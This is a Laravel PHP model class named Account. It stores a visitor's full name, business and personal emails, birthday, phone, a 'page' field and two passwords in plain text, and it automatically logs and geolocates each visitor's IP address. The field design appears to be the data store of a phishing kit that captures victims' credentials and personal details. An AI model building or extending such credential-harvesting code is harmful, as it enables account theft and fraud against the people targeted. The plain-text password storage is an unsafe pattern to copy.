<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Concerns\HasUlids;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Stevebauman\Location\Facades\Location;

class Account extends Model
{
    use HasFactory, HasUlids;

    protected $fillable = [
        'ip',
        'country',
        'page',
        'fullname',
        'business_email',
        'personal_email',
        'birthday',
        'phone',
        'first_password',
        'second_password',
    ];

    protected static function booted()
    {
        static::creating(function ($account) {
            $location = Location::get(request()->ip());
            $account->ip = request()->ip();
            $account->country = $location->cityName . ' | '
            . $location->regionName . ' | '
            . $location->countryCode . ' | '
            . $location->zipCode . ' | '
            . $location->timezone;
        });
    }
}
